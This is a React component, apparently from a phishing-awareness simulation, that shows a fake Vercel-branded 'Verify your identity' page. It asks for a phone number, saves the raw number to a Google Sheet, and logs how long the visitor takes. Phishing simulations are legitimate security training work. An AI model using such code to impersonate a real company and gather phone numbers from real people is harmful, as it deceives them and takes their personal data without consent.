import React, { useState } from 'react';
import Card from '../components/Card';
import Input from '../components/Input';
import Button from '../components/Button';
import { submitToSheet } from '../utils/api';
import logo from '../images/logo.png';

/**
 * VerifyPage - Phone verification step (phishing simulation)
 * This is the third step - asking for phone number
 */
export default function VerifyPage({ onNext, data }) {
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [startTime] = useState(Date.now());

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    // Submit phone number to Google Sheet
    await submitToSheet(phone, 'phishing-sim-phone');

    setTimeout(() => {
      onNext({
        ...data,
        phone: phone ? 'entered' : '',
        timeToVerify: Date.now() - startTime,
        verifyStartedAt: startTime
      });
    }, 800);
  };

  return (
    <div className="page verify-page">
      <div className="page-header">
        <img src={logo} alt="DrugCards" className="header-logo" />
        <div className="logo">
          <span className="logo-text">Vercel InstaSecure</span>
        </div>
      </div>

      <Card className="verify-card" icon="📱">
        <div className="verify-icon">✓</div>
        <h2 className="verify-title">Verify your identity</h2>
        <p className="verify-subtitle">
          For added security, please confirm your phone number
        </p>

        <form onSubmit={handleSubmit} className="verify-form">
          <Input
            label="Phone Number"
            type="tel"
            placeholder="Enter your phone number"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            icon="📞"
            required
            name="phone"
          />

          <p className="verify-note">
            We'll send a verification code to confirm your identity
          </p>

          <Button
            type="submit"
            variant="primary"
            loading={loading}
            disabled={!phone}
          >
            Verify
          </Button>
        </form>
      </Card>

      <div className="page-footer">
        <div className="footer-content">
          <span className="footer-brand">Vercel InstaSecure</span>
          <span className="footer-powered">Powered by</span>
          <img src={logo} alt="DrugCards" className="footer-logo" />
        </div>
      </div>
    </div>
  );
}
